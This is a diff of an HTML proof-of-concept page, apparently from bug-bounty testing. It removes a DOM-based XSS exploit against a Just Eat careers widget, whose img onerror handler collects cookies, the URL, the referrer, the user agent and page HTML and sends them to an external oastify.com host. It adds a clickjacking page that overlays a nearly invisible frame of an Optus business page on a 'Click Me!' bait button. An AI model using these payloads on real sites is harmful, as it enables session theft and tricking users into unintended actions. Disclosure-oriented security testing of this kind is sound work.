@@ -1,32 +1,36 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>🔥 Just Eat Widget XSS PoC</title>
+    <title>Clickjacking PoC - Optus</title>
+    <style>
+        body {
+            margin: 0;
+            overflow: hidden;
+        }
+        iframe {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            opacity: 0.01;
+            z-index: 999;
+            pointer-events: auto;
+        }
+        #bait {
+            position: absolute;
+            top: 200px;
+            left: 300px;
+            width: 200px;
+            height: 50px;
+            background-color: red;
+            color: white;
+            text-align: center;
+            line-height: 50px;
+            z-index: 1;
+        }
+    </style>
 </head>
 <body>
-  <h2>DOM-Based XSS in Just Eat Careers Widget</h2>
-
-  <!-- DOM XSS trigger via vulnerable enhancer -->
-  <div class="ph-widget" as-element="exploitWidget">
-    <img src=x onerror="
-      (() => {
-        let d = ''
-          + document.cookie + '\\n'
-          + location.href + '\\n'
-          + document.referrer + '\\n'
-          + navigator.userAgent + '\\n'
-          + document.documentElement.outerHTML.slice(0, 1500);
-        new Image().src = 'https://w63mft1b11m7qutvquknb5s1hsnobkz9.oastify.com/log?x=' + encodeURIComponent(d);
-      })();
-    ">
-  </div>
-
-  <!-- Trigger the vulnerable widget JS -->
-  <script src="https://careers.justeattakeaway.com/global/en/phenomtrack.min.js"></script>
-  <script>
-    setTimeout(() => {
-      if (window.PhEnhancer) PhEnhancer();
-    }, 100); // small delay to avoid race condition
-  </script>
+    <div id="bait">Click Me!</div>
+    <iframe src="https://www.optus.com.au/business/mobile/plans/shop"></iframe>
 </body>
 </html>
